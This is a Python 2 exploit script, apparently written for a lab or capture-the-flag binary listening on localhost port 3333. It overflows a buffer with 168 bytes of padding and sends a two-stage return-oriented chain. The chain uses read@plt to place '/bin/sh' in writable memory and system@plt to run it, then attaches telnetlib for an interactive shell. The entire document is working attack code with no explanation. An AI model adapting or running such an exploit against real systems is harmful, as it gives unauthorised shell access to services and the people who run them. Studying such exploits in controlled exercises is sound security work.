#!/usr/bin/env python

import telnetlib
from socket import *
from struct import *
import binascii

read_plt = 0x401070 # Address of read@plt
system_plt = 0x401050 # Address of system@plt
pop3ret = 0x401166 # Address of gadget

writeable = 0x404050 # Writable memory location

buf = ""
buf += "A"*168

# Stage 1
buf += pack("<Q", pop3ret)
buf += pack("<Q", 0x0)
buf += pack("<Q", writeable)
buf += pack("<Q", 0x8)
buf += pack("<Q", read_plt)

# Stage 2
buf += pack("<Q", pop3ret)
buf += pack("<Q", writeable)
buf += pack("<Q", 0x1)
buf += pack("<Q", 0x1)
buf += pack("<Q", system_plt)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 3333))

print "Received: ", binascii.hexlify(s.recv(1204))

# Send constructed buf
print "Sending: ", binascii.hexlify(buf + "\n")
s.send(buf + "\n")

print "Received: ", binascii.hexlify(s.recv(1204))

# Send "/bin/sh"
print "Sending: '/bin/sh'"
s.send("/bin/sh")

# Get a shell
t = telnetlib.Telnet()
t.sock = s
t.interact()
